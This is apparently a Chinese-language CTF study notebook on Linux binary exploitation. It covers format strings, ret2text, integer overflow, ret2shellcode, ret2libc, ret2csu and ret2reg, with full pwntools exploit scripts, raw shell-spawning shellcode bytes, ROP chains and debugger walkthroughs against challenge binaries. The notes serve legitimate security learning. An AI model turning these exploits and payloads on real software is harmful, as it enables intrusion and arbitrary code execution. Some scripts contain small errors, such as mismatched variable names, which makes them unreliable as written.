# Pwn

[toc]

# **PS：本笔记基于CTFHub和攻防世界，以及CTF-wiki，基于自身小白经历编写而成**



[CTF-wiki]: https://ctf-wiki.org/pwn/linux/user-mode/environment/	"ctf-wiki知识库"
[CTFHub]: https://www.ctfhub.com/#/skilltree	"ctfhub技能树"
[攻防世界]: https://adworld.xctf.org.cn/challenges/list	"题库"



# PS：尽量采用相同位数的系统作答



## 0、如何安装pwndbg?

[gdb与peda、pwngdb、pwndbg组合安装与使用_gdb peda-CSDN博客](https://blog.csdn.net/whbing1471/article/details/112410599)



### edb-debuger的安装

[eteran/edb-debugger: edb is a cross-platform AArch32/x86/x86-64 debugger. (github.com)](https://github.com/eteran/edb-debugger)

```
edb --stdin input.txt --stdout output.txt --run pwn200
```

标准使用方式，input为payload的输入处，output是输入过程中的输出处



## A、字符串格式化溢出

[原理介绍 - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)

很好懂：

两个步骤：

### 1、暴露输入的变量在栈的位置：

```
"AAAA %08x %08x %08x %08x %08x %08x %08x………… "
```

一直到输出对应的数值，可以知道是11，也即偏移量offset
![image-20240429193235384](${images}/image-20240429193235384.png)



### 2、使用**fmtstr_payload**

```
fmtstr_payload(offset,{be_change_addr:value})
```

即：在偏移量为offset处的位置使用任意地址漏洞将be_change_addr读写为value的值，原理。。。。。就是使用了某参数，C语言格式化字符串的漏洞



## 1、栈溢出



### 1、（1）ret2text



```
gdb pwn
```

```
checksec
```

![image-20240417170744847](${images}/image-20240417170744847.png)

No PIE意味着我们不需要额外暴露地址去寻找

No Canary Found说明可以栈溢出，不需要借助字符串格式化暴露canary

NX unknown说明有可能栈可执行，注入shellcode

RWX segment说明有段空间可Read Write Exe

Stack Executabal说明栈可执行

IDA访问文件=》然后F12看地址，F5看代码，X定位函数

以下是payload

```
from pwn import *

#r = remote('challenge-1b798affac46fc18.sandbox.ctfhub.com',37755)#建立远程连接
r = process('./pwn')

payload = b'A' * 0x78 + p64(0x4007b8)

r.sendline(payload)
r.interactive()
```



#### edb-debuger调试：原理测试

![image-20240417172935490](${images}/image-20240417172935490.png)

看到第五个参数是02，说明是x64程序，虽然看旁边的地址也知道是64位的



先通过IDA反编译代码得知main函数地址00000000004007C7

修改RIP或者直接定位到00000000004007C7处也可以

按CTRL+B就可以植入

![image-20240417170029509](${images}/image-20240417170029509.png)

edb更考验的是对汇编的理解

通过IDA查找到一个system函数的调用，前面说了可能有栈溢出漏洞，那么栈溢出，通常与这几个函数有关：read，gets

![image-20240417170657273](${images}/image-20240417170657273.png)

回到main函数，找到一个不限制数值的gets

![image-20240417171904320](${images}/image-20240417171904320.png)

lea rax，[rbp-0x70]

这句话会让rax的值发生变化，变为rbp-0x70的地址

可以看出输入0x70字符左右，并且是距离在rbp往前偏移0x70处，让我们查看，并且跳转到最近的rbp更新的地方，

![image-20240417173146168](${images}/image-20240417173146168.png)

可以看到，这里会将rbp的值，更新为rsp的值，rsp是栈顶函数指针，然后rsp更新到距离-0x70处，意味着我们写入的的地方就是栈顶

![image-20240417173513000](${images}/image-20240417173513000.png)

编写一个简单的gets方法的实现方式：

```
#include <stdio.h>

int main() {
    char buffer[100]; // 分配一个缓冲区

    printf("请输入一个字符串：\n");
    gets(buffer); // 获取用户输入的字符串，存储在buffer中

    printf("你输入的字符串是：%s\n", buffer);

    return 0;
}

//gcc -o my_program my_program.c

```

EDB打开，定位到read函数的附近，按CTRL+SHIFT+F

![image-20240417174500495](${images}/image-20240417174500495.png)

![image-20240417174728880](${images}/image-20240417174728880.png)

可以看到，都是需要rdi寄存器去存储字符串地址(因为通常这个寄存器就是拿来干这个的)

因此回到程序上，可以看到我们rdi寄存器的位置由rax导入，然后这一步后

![image-20240417174939755](${images}/image-20240417174939755.png)

rax的值会重新变化，因为eax就是低位rax的32位寄存器，简而言之就是rax低8位地址，然后高32位会被清0

![image-20240417175004364](${images}/image-20240417175004364.png)

然后call gets函数，向rdi寄存器输入字符

![image-20240417175837608](${images}/image-20240417175837608.png)

观看stack里数据，注意到ret在stack里，那么因为gets函数不限制数据的长度，那么我们是否可以通过覆盖的方式，使得ret到我们想要的函数处，即system("/bin/sh")处？答案是可以的，我们计算一下它距离的地址，注意前面的地址标志的是开始的地址，因此是CB18-CAA0，注意到前8位都相同，所以我们只需要：

![image-20240417180326297](${images}/image-20240417180326297.png)

需要输入78个字符，然后再输入想要跳转到的地址：(0x4007b8)，需要等待"/bin/sh"字符串的输入

![image-20240417180651595](${images}/image-20240417180651595.png)

![image-20240417183115992](${images}/image-20240417183115992.png)

按F8到call处，然后再按F9或者直接按F9

随便输入个回车后，在栈顶CTRL+E，在ASCII栏处输入78个A，在hex栏手动输入地址（小端序，即b8 07 40 00 00 00 00 00）

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

![image-20240417183256180](${images}/image-20240417183256180.png)

![image-20240417184150555](${images}/image-20240417184150555.png)

****

双击栈顶更新后,可以看到已经覆盖住了，然后等待stack处理完数据，或者直接F9，直接看成果

![image-20240417184923564](${images}/image-20240417184923564.png)

![image-20240417184335211](${images}/image-20240417184335211.png)

### 1、（2）整形溢出

```
from pwn import *

p = remote('61.147.171.105','52510')

flag_addr = 0x804868B

p.sendlineafter("Your choice:",b'1')

p.sendlineafter("Please input your username:\n",b'root')

offset = 0x14+0x4

payload = offset * b'a' + p32(flag_addr) + (0x100-offset-0x4+0x4) * b'a'
#256溢出4变成4

print(len(payload))

p.sendlineafter("Please input your passwd:\n",payload)

p.interactive()
```

#### edb-debuger调试：原理测试

![image-20240418164418378](${images}/image-20240418164418378.png)

进来先看第五位，01，32位程序，gdb checksec查看情况

![image-20240418164722666](${images}/image-20240418164722666.png)

可栈溢出，堆栈不可执行，地址不随机化，那么答案显而易见，栈溢出到system即可

在edb按CTRL+SHIFT+F调出

![image-20240418165800627](${images}/image-20240418165800627.png)

观察箭头所指的几个函数，main函数以及其他自定义函数，以及system函数的plt调用，之前分析checksec得知可能存在栈溢出漏洞，先去往main函数查看源码（可点击下面的按扭进行图形化显示）

![image-20240418170206540](${images}/image-20240418170206540.png)

ok到这里大概知道main函数的内容了，也就是实现菜单选择的功能，根据选择的不同，实现对应功能

![image-20240418170434457](${images}/image-20240418170434457.png)

这里实现相对应的选择菜单

je指令也就是if条件选择语句，配合图形化界面不难看出：

![image-20240418170745509](${images}/image-20240418170745509.png)

在这个标签处(0x8048720)，先是调用了一个函数，再跳转到0x80488c8处执行

分别去往两块地方查看，

标签处(0x8048720)：

![image-20240418171248679](${images}/image-20240418171248679.png)

不难看出这是实现了一个login效果的函数，也就是login()函数，观察一下两个输入点read函数，翻出32位下read函数的实现：

![image-20240418172018684](${images}/image-20240418172018684.png)

那么第一个read函数处就是read(0,eax,0x19)，0x19<0x28显然不行栈溢出

第二个read函数处就是read(0,eax,0x199)，0x199<0x228好像也不行

没关系，还有一个函数就是下面的check_passwd函数

![image-20240418173012343](${images}/image-20240418173012343.png)

大概代码格局如上，有选择的方向，call了一个位于0x8048540的函数，查看一下是什么函数

![image-20240418173122312](${images}/image-20240418173122312.png)

答案是strlen，也就是读取输入的字符串的长度

![image-20240418174508070](${images}/image-20240418174508070.png)

对strlen的调用不熟，可以编写一下程序，观察汇编指令

```C
#include <stdio.h>
#include <string.h>

int main() {
    char str[] = "Hello, world!";
    size_t len = strlen(str);
    printf("Length of the string: %zu\n", len);
    return 0;
}
// gcc -m32 -o strlen_32 strlen.c
// gcc -o strlen_64 strlen.c
```

![image-20240418175242354](${images}/image-20240418175242354.png)



不难看出，会将数据放置在eax处

因此这里会将al的数据存储在[ebp - 9]处，而又al是ax的低8位，也就是能容纳0-255，即256个数据，256也就是0x100

![image-20240418175556039](${images}/image-20240418175556039.png)

而我们传入的数据足足有0x199个，那么因为这里存在着对[ebp - 9]数据的比较，那么观察条件：（大于3小于8）即可通过

- `JBE` 指令：Jump if Below or Equal，如果前一个比较指令中的两个操作数的值之间的关系是 "小于或等于"，则执行跳转。
- `JA` 指令：Jump if Above，如果前一个比较指令中的两个操作数的值之间的关系是 "大于"，则执行跳转。

![image-20240418175710615](${images}/image-20240418175710615.png)

，也就是我们塞入256+n(3<n<8)(选4比较好，因为32位嘛)的数据即可，但目前这里还没什么用，再往下看

![image-20240418180349879](${images}/image-20240418180349879.png)

这里使用了一个strcpy的函数，将

strcpy的汇编如下

![image-20240418180812648](${images}/image-20240418180812648.png)

可见，这里会将[ebp + 8]的数据复制到eax([ebp -0x14])中，显而易见的，可使用栈溢出漏洞，付出0x14+0x4即可

那么最后我们的数据这样子放即可

```
offset = 0x18
payload = b'a'*offset + p64(used_addr)
payload += (0x100-strlen(payload)+0x4) * b'a'
```

就可以在满足条件下，进行栈溢出，以达到目的，还记得之前注意的system调用以及一个函数what is this嘛，去查看一下

![image-20240418181358359](${images}/image-20240418181358359.png)

显而易见前者是plt地址处

后者：

![image-20240418181426039](${images}/image-20240418181426039.png)

ok，used_addr = 0x804868b



注意在输入password处下一步，设置break point，然后修改栈顶即可

![image-20240418182143209](${images}/image-20240418182143209.png)

操作步骤，选择1，填入root（或者合适用户名），在输入payload(这里根据之前的教法来即可)（也就是先填入数据，在手动输入hex地址，在填数据，即可完成）

![image-20240418183315223](${images}/image-20240418183315223.png)

```
aaaaaaaaaaaaaaaaaaaaaaaa
```

hex栏处

```
8b 86 04 08
```

然后在ascii栏输入

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

点击ok，双击更新

![image-20240418183417409](${images}/image-20240418183417409.png)

可以看到运行成功

事后查看IDA

![image-20240418184246871](${images}/image-20240418184246871.png)

![image-20240418184309256](${images}/image-20240418184309256.png)

和我们预想的一样，就是256(unsigned __int8 ) 类型的变量可以容纳 0 到 255 之间的任意整数值，包括 0 和 255。

### 1、（3）ret2shellcode

![image-20240313162536569](${images}/image-20240313162536569.png)

> checksec展示了没有开启栈溢出保护，以及还有RWX的操作

使用vmmap查看那里可以rwx

1. 先`gdb pwn`
2. 然后`run`
3. 然后`b main`
4. 然后`vmmap`

**![image-20240313164952099](${images}/image-20240313164952099.png)**

优先考虑除stack之外的攻击对象

如何确定攻击方式？：

1. readelf获取信息
2. 使用IDA阅读源码

```
readelf -S pwn | grep bss
```

```
readelf -S pwn | grep data
```

![image-20240313172201841](${images}/image-20240313172201841.png)



从中获取了信息：

bss段的地址范围为：0x601048~0x601048+0x10

data段的地址范围为：0x601038~0x601038+0x10



又vmmap展示了0x400000~0x602000又rwx属性

因此bss和data都是rwx的



IDA阅读源码

![image-20240313172702206](${images}/image-20240313172702206.png)



有个buf隶属于main空间的变量

![image-20240313173238591](${images}/image-20240313173238591.png)

可以得知，buf的地址为0x400607身处rwx区

![image-20240313173422252](${images}/image-20240313173422252.png)

![image-20240313173558932](${images}/image-20240313173558932.png)



那么payload要实现：

1. buf实现缓冲区溢出，复写main函数的return_address
2. buf装shellcode



那么payload要求：

1. shellcode：执行sh
2. n字节的垃圾数据：溢出到ret_addr
3. 容纳shellcode的地址：buf_addr+所有数据(0x20)



那么exp：

```
from pwn import *
import re

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

#r = remote('challenge-c3b38bfcad408f15.sandbox.ctfhub.com',33975)

r = process('./pwn')
buf_addr = r.recvuntil(']')
buf_addr = int(buf_addr[-15:-1],16)#处理数据

shellcode_addr = buf_addr + 32 # 0x20
payload = b'a'*(0x18) + p64(shellcode_addr)+shellcode

r.sendline(payload)
r.interactive()
```



[CTFer成长日记8：栈溢出利用—ret2shellcode - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/463756050)



#### edb-debuger调试：原理测试

![image-20240419175530665](${images}/image-20240419175530665.png)

64位

![image-20240419175633869](${images}/image-20240419175633869.png)

分析：

栈溢出、堆栈执行、有rwx

提出：

ret2text、ret2shellcode



函数查找

CTRL+SHIFT+F

![image-20240419180030506](${images}/image-20240419180030506.png)

main函数一枚

![image-20240419180208341](${images}/image-20240419180208341.png)

分析：

![image-20240419180315084](${images}/image-20240419180315084.png)

三次输出，代表：提示、栈顶地址、输入

理由：

提示：这就不用说了

栈地址：

lea rdi , [rel 0x400718]

将地址 0x400718 中的数据加载到 rdi 寄存器中

![image-20240419181255808](${images}/image-20240419181255808.png)

输入：🈚️

然后紧接着就是read函数，对rbp-0x10处输入内容，大小为0x400，这里已经是直接栈溢出了，0x10<0x400，那么我们刚刚寻找函数并没有找到system函数，因此这里可以使用ret2libc的方法，不过这里既然都可以rwx了：（即stack），那就写入shellcode即可

![image-20240419182209712](${images}/image-20240419182209712.png)

shellcode是编译后的汇编代码，因此栈溢出后跟着地址，这个地址要紧跟着ret，因此写入的地址为：stack_addr + 0x18(b'a' * offset) + 0x8跟着数据即可

也就是0x20

offset为什么是0x18？

因为调用的变量为rbp-0x10处，rbp是什么？所以因此，是0x10+0x8（saved register的大小）

即：

```
#shellcode可以直接生成
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
shellcode_addr = stack_addr + 0x20
payload = b'a' * offset + p64(shellcode_addr) + shellcode
```

因此很明朗：

给出放断点的位置，以及如何输入数据：

![image-20240419184516626](${images}/image-20240419184516626.png)

拿取到stack_addr:0x7fffbbc7aac0

![image-20240419190627159](${images}/image-20240419190627159.png)

来到call read处继续F9，输入1234回车后修改数据

![image-20240419190639903](${images}/image-20240419190639903.png)

![image-20240419184838559](${images}/image-20240419184838559.png)修改数据即可

CTRL+E

ASCII先输入

记得取消Keep size

```
aaaaaaaaaaaaaaaaaaaaaaaa
```

然后输入stack_addr:0x7fffbbc7aac0+0x20后的结果0x7fffbbc7aae0

```
e0 aa c7 bb ff 7f 00 00
```

再输入shellcode的内容

hex栏处所有内容如此：

```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 e0 aa c7 bb ff 7f 00 00 6a 68 48 b8 2f 62 69 6e 2f 2f 2f 73 50 48 89 e7 68 72 69 01 01 81 34 24 01 01 01 01 31 f6 56 6a 08 5e 48 01 e6 56 48 89 e6 31 d2 6a 3b 58 0f 05 0a
```

即可

![image-20240419190901944](${images}/image-20240419190901944.png)

### 1、（4）ret2libc

![image-20240313182943008](${images}/image-20240313182943008.png)

> 没有PIE



main函数：

![image-20240313183734172](${images}/image-20240313183734172.png)

含有system函数的secure函数：

![image-20240313183755768](${images}/image-20240313183755768.png)

这里的要点因为没有sh

因此需要使用system函数构造system("/bin/sh")

![image-20240313184714674](${images}/image-20240313184714674.png)



1. s的首地址和ebp的差值(需要溢出)
2. system@plt的具体数值(借用system函数)
3. 字符串"/bin/sh"所在地址(构建后门)



IDA或者gdb动态调试即可

获取1的方法：

方法一：gdb动态调试

```
先运行文件
ret2libc
新开窗口
sudo ps aux | grep ret2libc
gdb -p <pid>
在另一边输入s的内容
n或s
逐步查看s的地址
S：0xffecac28

IDA查看s可容纳多少：
0x(60+4*4)=0x(70)
也可以使用pwndbg里的内容：
这里需要从
gdb ret2libc
然后：
cyclic 200
r
出现的地址（Invalid address 0x62616164）用
cyclic -l 0x62616164
就可以得知偏移量为112(0x70)


IDA查看system函数地址：
要查看.plt的_system
0x08048460
IDA查看"/bin/sh"地址：
0x08048720

或者使用python：
got.plt中的信息也可以使用file.got查看
from pwn import *

file = ELF("./ret2libc1")
system = file.plt["system"]  #file.plt是一个字典，索引是函数名
bin_sh = next(file.search(b"/bin/sh"))  #file.serch()返回一个generator，需要使用next函数查看其中的内容

```



此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在

```
ROPgadget --binary ret2libc1 --string '/bin/sh'
```



那么exp就为：

```
from pwn import *

p = process("./ret2libc")
f = ELF("./ret2libc")
s = file.plt["system"]
b = next(file.search(b"/bin/sh"))

pay = b"A"*(0x70) + p32(s) + b"A" * (0x4) + p32(b)
p.sendline(pay)
p.interactive()
```

![image-20240314085209859](${images}/image-20240314085209859.png)

[CTFer成长日记10：动态链接的基本过程与ret2libc - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/464311858)



#### edb-debuger调试：原理测试

![image-20240422194936916](${images}/image-20240422194936916.png)

32位程序

![image-20240422195054960](${images}/image-20240422195054960.png)

有NX保护，无法堆栈执行，可栈溢出

##### Funtion Find

![image-20240422200102902](${images}/image-20240422200102902.png)

两个值得注意的函数secure函数和main

###### main 函数

![image-20240422200337557](${images}/image-20240422200337557.png)

提示后进行输入：

![image-20240422200427098](${images}/image-20240422200427098.png)

gets函数栈溢出

offset 还不清除，因为ebp未知

###### secure 函数

![image-20240422200743644](${images}/image-20240422200743644.png)

有system函数，有"/bin/sh"字符串

CTRL+F唤出字符串查找

![image-20240422201442808](${images}/image-20240422201442808.png)

![image-20240422201448246](${images}/image-20240422201448246.png)

前往两个地址查看：

0x08048720:

超出地址外：猜测在libc里，比较麻烦，不用

0x08049720：

![image-20240422201724680](${images}/image-20240422201724680.png)

##### 攻击

- 传递字符串所在地址+system@plt即可getshell

在gets@plt处和下一块地方和system@plt处放置断点：

然后输入123回车后，123处修改为

对了，这时候我们并不知道ebp的具体值，那好办，在输入的字符串前，或者变量定义处，放置断点：

![image-20240422204910029](${images}/image-20240422204910029.png)

此处没有算上+0x1c，因此算术的时候加上

算出：0x118-(0x90+0x1c)+0x4 = 0x70

那么offset = 0x70 = 112

```
payload = b'a' * offset + p32(system_plt) + p32(4) + p32(bin_sh_addr)
```

![image-20240422211904897](${images}/image-20240422211904897.png)

![image-20240422211921169](${images}/image-20240422211921169.png)

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
11 86 04 08
```

```
20 87 04 08
```

![image-20240422212025991](${images}/image-20240422212025991.png)

![image-20240422212117900](${images}/image-20240422212117900.png)

放行：（F9）

对了直接使用system函数就不需要额外加4字节内容，直接后接字符串地址即可，如果采用的是11 86 04 08，就说明我们使用的是system函数，采用plt也就是：

![image-20240422213300821](${images}/image-20240422213300821.png)

则需要额外输入4个字节内容

为什么会加p32(4)，我们看一下call system@plt的调用过程：

call 指令一般是这样的：

```
push ip					;执行system@got之后的返回地址
jmp system@got
```

那么在跳转之前会将栈中一个4字节的内容作为eip的地址推入，然后esp-4,然后才跳转到system的地址，此时才是执行以下的操作:

```
push    edx             ; command
mov     ebx, eax
call    real_system
```

这样command才正式被推入，因此这就是额外输入一个4字节垃圾数据的原因了，那么这里我们就可以输入main函数的地址作为填充也可以，这样system返回后会再次运行main函数，这对构建gadgets链有帮助。

那么开始攻击：

放置好恰当的断点：

ASCII输入offset数的字符：

hex栏输入小端序化地址：
输入4个随便字节数据:

输入/bin/sh地址：

有两个合法的地址：

8720

9720

挑一个用：

我选择8720

```
payload = b'a' * offset + p32(system_plt) + p32(4) + p32(bin_sh_addr)
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
60 84 04 08
```

```
61 61 61 61
```

```
20 87 04 08
```

![image-20240422213622819](${images}/image-20240422213622819.png)

### 1、（5）ret2csu

[中级ROP - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)

[【技术分享】借助DynELF实现无libc的漏洞利用小结-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/85129)



```python

```



#### edb-debuger调试：原理测试

![image-20240423160034655](${images}/image-20240423160034655.png)

64位程序

![image-20240423160247578](${images}/image-20240423160247578.png)

可栈溢出，堆栈不可执行，部分重载

##### Function find

没有很明确的函数，只有几个plt，先运行一下程序，然后根据出现的字符串寻找运行的函数，只有plt的情况下，就要寻求libc的方式。利用plt来执行想要的操作，和暴露libc基地址

![image-20240423160757720](${images}/image-20240423160757720.png)

只有输入，没有提示词，那就查找使用了read，gets等函数的plt

![image-20240423161526917](${images}/image-20240423161526917.png)

去这三个函数处，看看有没有调用read@plt的

第一处

![image-20240423162016912](${images}/image-20240423162016912.png)

第二处，没有，简单的输出提示，但是有一个调用了63d处的函数

![image-20240423161718579](${images}/image-20240423161718579.png)

第三处，没有直接的调用，但是可以看到这里进入了68e处

![image-20240423161825541](${images}/image-20240423161825541.png)

那么这几处函数的关系是：6b8->68e->63d，那么也可以看出，只有这三处有函数特有的leave ret，也就是说这几个函数没有命名，但是我们可以根据这个判断，那个是main（或者程序入口），那就是在每个函数入口放断点，先进入哪个，哪个就是main；

![image-20240423162506015](${images}/image-20240423162506015.png)

结果显示6b8是main函数，那么调用链成立：6b8->68e->63d

因为我们事先运行过函数，那么我们可以得知，程序会进入输入的函数，那么也就只有63d，拥有输入函数，先看main函数的内容

![image-20240423162914076](${images}/image-20240423162914076.png)

没有什么值得注意的，前往68e

![image-20240423163136416](${images}/image-20240423163136416.png)

也没有什么值得注意的，前往63d，注意这里是64位程序，那么这里就对63d函数传入了三个参数，rdi、rsi，rdx

![image-20240423175331640](${images}/image-20240423175331640.png)

那么read函数处就存在栈溢出，但我们在此程序没有看到system函数的调用，那么有以下思路：

1. 借用puts函数暴露read函数地址，查询libc，然后算出基地址，加system和"/bin/sh"字符串的地址，getshell，此过程需要能够构建成ROP链的gadgets，因此

2. 使用csu机制，即每次开始使用函数会对rbx/rbp/r12/r13/r14/r15赋值，r12是直接被调用的，然后单独再次使用r13的值传给rdx,r14的值传给rsi,r15的低32位传给rdi的低32位的值，然后高32位被置零，那么如果我们优先返回到0x40075a，然后将栈中的值构建成类似的，然后再溢出8位，覆盖retn到740，并注意rbp和rbx的值，那么我们就可以使用这个返回到任意函数了

   ![image-20240423182310101](${images}/image-20240423182310101.png)

   ![image-20240423181846566](${images}/image-20240423181846566.png)
   ![image-20240423182507841](${images}/image-20240423182507841.png)

![image-20240424171031332](${images}/image-20240424171031332.png)

那么此时构建的payload应该为：

![image-20240423185208167](${images}/image-20240423185208167.png)

```
offset = 0xc8+0x8
changereg_addr = 0x40075a
assignment_addr = 0x400740
read_got = 0x601028
bin_sh_addr = 0x601080
#rbx为0,rbp为1即可
#即rbx+1 = rbp
# r12作为被调用函数
# r13 = rdx，作为函数的第三个参数
# r14 = rsi，作为函数的第二个参数
# r15 = rdi，作为函数的第一个参数
#栈溢出+溢出到的地址+构建csu(rbx,rbp,r12,r13,r14,r15)
payload = b'a' * offset + p64(changereg_addr) + p64(0) + p64(1) + p64(read_got)+p64(8)+p64(bin_sh_addr)+p64(0)
```

![image-20240423212437877](${images}/image-20240423212437877.png)

注意每个got会有一个ret，因此需要一个地址承接住（最好选择0x400740）,选择0x40075a也可以，只不过下面的会变成6*8字节罢了

跳过判断后，rsp会前移8个字节，同时我们又希望覆盖住（实际上是填充），所以这里可以用'\x00'也没关系，所以需要填充，同时pop这个指令会让rsp指针后移8位，因此我们需要在相对数据底部放置想要返回的地址(可以是上面mov：740，也可以直接到任意一个地方，只要你的栈布置得够好就行)

，同时填充7*8字节（看指令就知道了）,利用这个ret返回到函数开始的地方，并将剩下的字节填充完整

因此：

```
wanamov = 0x400740
start_addr = 0x4006b8
payload += p64(wanamov) + b'\x00' * 56 + p64(start_addr)
payload = payload.ljust(0x200,b'b')
```

注意我们调用了read函数，因此在发送后并接收到提示符

，我们要输入''/bin/sh\x00'

为什么会输出bye?

因为我们第一次修改的ret的地址是此函数的ret，在ret之前还有输出函数

![image-20240424165630127](${images}/image-20240424165630127.png)

![image-20240423222002054](${images}/image-20240423222002054.png)

```
p.send(payload)
p.recvuntil('bye~\n')
p.send(b'/bin/sh\x00')
```

回到main函数后，再次栈溢出，利用system@got将rdi指针指向bin/sh即可。

而且我们需要带有ret的rdi指针，那么很巧的是，有个通用的gadgets有：

![image-20240423214835218](${images}/image-20240423214835218.png)

也就是pop r15处的下个字节有，为什么不用上面的mov？因为mov不从栈中收取数据，

关于为什么会有，查看PS栏处的通用Gadgets就知道了

```
#调用system函数
payload = b'a' * offset#栈溢出
payload += p64(poprdi_addr)#retn指向rdi
payload += p64(bin_sh_addr)#rdi所需参数
payload += p64(0x4004e1)#此处调用的是got，因此需要添加一个返回值，以应付got的push
payload += p64(system_addr)#将上面的参数作为system函数的参数
payload = payload.ljust(200, b"B")#填充多余数据

p.send(payload)
p.interactive()
```

在edb我们可以直接修改寄存器的值，已达到快速的目的，这是写在python里的解法

![image-20240423215721879](${images}/image-20240423215721879.png)

双击就能修改数值，

![image-20240423215741763](${images}/image-20240423215741763.png)

stack也一样，直接CTRL+E就能修改栈数据，根据之前的操作方法来即可，不再赘述

##### 被遗忘的第一步：

注意到了么？我们现在并不知道system在哪里，那么就需要使用上面libc的知识了，不过不同的是，上面并没有提到如何查找没有system@plt，也没有so库的情况下，如何找到呢？

可以去看看PS里的csu简述里对无库环境下使用DynELF，还有libsearch库的帮助下，查找libc基地址和system相对位移

这里我们使用DynELF来操作，当然思路只要进行恰当的转化就可以在edb上使用，不过需要处理数据，比较麻烦，因此一般是利用python进行数据收取，当然只要对数据进行64位解码即可也就是u64

首先需要使用的就是暴露函数的地址leak函数：思路就是使用rdi gadget使用puts函数将rdi指定的地址打印，plt后有，因为跟着的就是got，因此后面需要附加一个返回地址，为了保证我们程序还能继续使用这个地址，那么选择main函数最好

这是函数:

```
def leak(addr):
    up = b''
    content = b''

    payload = b'a' * 0x48#栈溢出
    payload += p64(poprdi_addr)#gadget中的rdi的地址
    payload += p64(addr)#指定函数的地址
    payload += p64(puts_plt)#ROP的plt
    payload += p64(start_addr)#函数一开始的地方
    payload = payload.ljust(200,b'B')#其他地方填充垃圾数据
    #整体payload使用思想如下：
    #栈溢出覆盖ret到ROPgadget下的rdi处，指向指定函数的地址，使用ROP的plt再次重新启动start函数，在其他地方填充垃圾数据

    p.send(payload)
    p.recvuntil("bye~\n")
    while True: #防止未接收完整传回的数据
        c = p.recv(numb=1, timeout=0.1)
        if up == b'\n' and c == b"":
            content = content[:-1]+b'\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    return content


#关于DynELF实现无libc的漏洞学习：https://www.anquanke.com/post/id/85129
d = DynELF(leak,elf=pwn)
system_addr = d.lookup('system', 'libc')
```

##### 整个exp

```
from pwn import *
from pwn import p64
from LibcSearcher import LibcSearcher


p = process('./pwn')

offset = 0x40+0x8
changereg_addr = 0x40075a

poprdi_addr = 0x400763
puts_plt = 0x400500
puts_got = 0x601018
read_plt = 0x400520
read_got = 0x601028
start_addr = 0x4006b8
bin_sh_addr = 0x601000
wanamov = 0x400740

pwn = ELF('./pwn')

def leak(addr):
    up = b''
    content = b''

    payload = b'a' * 0x48#栈溢出
    payload += p64(poprdi_addr)#gadget中的rdi的地址
    payload += p64(addr)#指定函数的地址
    payload += p64(puts_plt)#ROP的plt
    payload += p64(start_addr)#函数一开始的地方
    payload = payload.ljust(200,b'B')#其他地方填充垃圾数据
    #整体payload使用思想如下：
    #栈溢出覆盖ret到ROPgadget下的rdi处，指向指定函数的地址，使用ROP的plt再次重新启动start函数，在其他地方填充垃圾数据

    p.send(payload)
    p.recvuntil("bye~\n")
    while True: #防止未接收完整传回的数据
        c = p.recv(numb=1, timeout=0.1)
        if up == b'\n' and c == b"":
            content = content[:-1]+b'\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    return content


#关于DynELF实现无libc的漏洞学习：https://www.anquanke.com/post/id/85129
d = DynELF(leak,elf=pwn)
system_addr = d.lookup('system', 'libc')

#rbx为0,rbp为1即可
#即rbx+1 = rbp
# r12作为被调用函数
# r13 = rdx，作为函数的第三个参数
# r14 = rsi，作为函数的第二个参数
# r15 = rdi，作为函数的第一个参数
payload = b'a' * offset + p64(changereg_addr) + p64(0) + p64(1) + p64(read_got)+p64(8)+p64(bin_sh_addr)+p64(0)
payload += p64(wanamov) + b'\x00' * 56 + p64(start_addr)
payload = payload.ljust(200,b'b')
p.send(payload)
p.recvuntil(b'bye~\n')
p.send(b'/bin/sh\x00')
#调用system函数
payload = b'a' * offset#栈溢出
payload += p64(poprdi_addr)#retn指向rdi
payload += p64(bin_sh_addr)#rdi所需参数
payload += p64(0x4004e1)#此处调用的是got，因此需要添加一个返回值，以应付got的push
payload += p64(system_addr)#将上面的参数作为system函数的参数
payload = payload.ljust(200, b"B")#填充多余数据

p.send(payload)
p.interactive()
```



### 1、（6）ret2reg

[【pwn基础】— ret2reg - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/615001792)

```c
#include <stdio.h>
#include <string.h>

void vuln(char *input) {
        char buffer[512];
        strcpy(buffer, input);
}


int main(int argc, char **argv) {
        vuln(argv[1]);
        return 0;
}
```

```
gcc -z execstack -no-pie -z norelro  -fno-stack-protector -m32 ret2reg.c -g -Wall -o ret2reg
```

使用pwngdb设置断点在leave处

![image-20240406171001100](${images}/image-20240406171001100.png)



设置一个参数并运行，观察返回时的EAX、ECX、EDX

```
set args 123456
```

![image-20240406171123889](${images}/image-20240406171123889.png)

可以看到是指向缓冲区的



查找返回地址偏移量

![image-20240406171827001](${images}/image-20240406171827001.png)

=0x10-0x4=0xD



